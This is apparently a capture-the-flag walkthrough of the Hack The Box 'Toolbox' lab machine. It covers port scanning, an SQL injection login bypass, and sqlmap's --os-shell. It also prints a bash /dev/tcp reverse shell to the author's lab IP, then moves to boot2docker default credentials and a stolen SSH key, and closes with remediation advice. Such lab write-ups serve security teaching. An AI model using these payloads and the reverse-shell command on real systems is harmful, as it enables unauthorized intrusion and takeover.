# Enumeration: 
```bash
Nmap scan report for 10.10.10.236
Host is up (0.019s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  https         Apache/2.4.38 (Debian)
|_http-server-header: Apache/2.4.38 (Debian)
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m48s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-23T17:23:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.77 seconds
```
</br>

**Initial Shell:** </br>
I went to the webpage on https://10.10.10.236/ and saw a website for a company called MegaLogistics. </br>
On the nmap scan, we see a commonName=```admin.megalogistic.com``` , so I added it to the /etc/host file, and tried to get inside: </br>
![admin_mainpage](images/toolbox/admin_mainpage.png) </br>
It looks like a login page, I tried to see if it was vulnearble to SQL Injections using ```'``` on the password field, and it displayed an error message: </br>
```bash
Warning: pg_query(): Query failed: ERROR: unterminated quoted string at or near “’’’);” LINE 1: …FROM users WHERE username = ‘admin’ AND password = md5(‘’’); ^ in /var/www/admin/index.php on line 10

Warning: pg_num_rows() expects parameter 1 to be resource, bool given in /var/www/admin/index.php on line 11
```
</br>

I used this payload: ```' or 1=1-- -``` and successfully bypassed the login form: </br>
![admin_dashboard](images/toolbox/admin_dashboard.png) </br>
I decided to use sqlmap for the SQL Enumeration but since it's a blind injection it was fairly difficult and i failed to enumerate it manually. </br>
I captured the request with burpsuite, and copied it to an empty file and then used this command: </br>
```sqlmap -r request.txt --dbs --force-ssl``` </br>
Sqlmap identified that the login page was vulnerable to SQL Injection but unfourtanetly I couldn't find anything useful. </br>
In some rare cases, sqlmap can obtain a operating system shell with flag ```--os-shell``` , I tried it out: </br>
```bash
sqlmap -r ./request.txt --dbs --os-shell --force-ssl --timeout 1000000000
```
</br>

It worked! to get a reverse shell, I then used this command to get a stable shell: ```bash -c 'bash -i &> /dev/tcp/10.10.14.21/9001 0>&1'``` </br>
and on another shell I listened to port 9001 with the command: ```nc -nlvp 9001``` </br>
![initial_shell](images/toolbox/initial_shell.png) </br>

# Privilege Escalation
Earlier, I tried getting inside the FTP service, and saw this: </br>
![ftp_login](images/toolbox/ftp_login.png) </br>
I tried to download the docker-toolbox to my windows machine, and figured that it installs VirtualBox, and creates a VM running the boot2docker Linux distribution. </br>
I ran a nmap scan, using nmap static binary, Before running the scan, I checked for my ip with ifconfig, and ran the scan with: </br>
```nmap 172.17.0.1/24``` </br>
Nmap Scan results: </br>
![nmap_scan](images/toolbox/nmap_scan.png) </br>
The First IP was the Virtual machine IP address, and since it had ssh open, I tried connecting to docker through it. </br>
I searched online for boot2docker default credentials, and found this: </br> </br>
![docker_default_creds](images/toolbox/docker_default_creds.png) </br> </br>
I got in: </br>
![ssh_shell](images/toolbox/ssh_shell.png) </br>
I tried looking for the root flag with: ```find / -name root.txt 2>/dev/null``` </br>
![find_root_flag](images/toolbox/find_root_flag.png) </br>
I also found this hidden folder in ```/C/Users/Administrator``` directory: </br>
![hidden_folder](images/toolbox/hidden_folder.png) </br>
Inside I found the SSH Private key: </br>
![ssh_private_key](images/toolbox/ssh_private_key.png) </br>
![ssh_private_key_2](images/toolbox/ssh_private_key_2.png) </br>
I used the keys using this commands: </br>
```chmod 600 id_rsa``` to give the file full read and write access </br>
```ssh -i id_rsa administrator@10.10.10.236``` </br> </br>
**Vulnerability Exploited:** Sensitive Data Exposure And Default Credentials Vulnerability </br>
**Vulnerability Explanation:** </br>
**Sensitive Data Exposure:** Sensitive data is any information that is meant to be protected from unauthorized access. </br>
Sensitive data can include anything from personally identifiable information, to banking information, to login credentials. </br>
When this data is accessed by an attacker as a result of a data breach, users are at risk for sensitive data exposure. </br>
**Default Credential Vulnerability:** A Default Credential vulnerability is a type of vulnerability in a
computing device that most commonly affects devices having some pre-set (default) administrative
credentials to access all configuration settings.
The vendor or manufacturer of such devices uses a single pre-defined set of admin credentials to access
the device configurations, and any potential hacker can misuse this fact to hack such devices, if those
credentials are not changed by consumers. </br> </br>
**Vulnerability Fix:** </br>
**Sensitive Data Exposure:** </br>
Classify data processed, stored or transmitted by an application. Identify which data is sensitive according to privacy laws, regulatory requirements, or business needs. </br>
- Don’t store sensitive data unnecessarily. </br>
- Make sure to encrypt all sensitive data at rest. </br>
- Ensure up-to-date and strong standard algorithms, protocols, and keys are in place; use proper key
management. </br>
- Store passwords using strong adaptive and salted hashing functions with a work factor. </br>

**Default Credential Vulnerability:** Ensuring not to use a known and weak password , and making sure to
change the original, default passwords. </br>








